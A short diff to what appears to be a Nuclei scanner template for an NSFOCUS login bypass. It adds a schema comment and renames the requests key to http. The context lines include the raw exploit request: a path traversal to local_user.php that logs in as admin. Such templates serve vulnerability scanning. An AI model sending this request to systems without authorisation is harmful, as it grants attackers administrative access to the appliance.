@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: nsfocus-loginBypass
 
 info:
@@ -6,7 +7,7 @@ info:
   severity: critical
   tags: nsfocus
 
-requests:
+http:
   - raw:
       - |
         GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
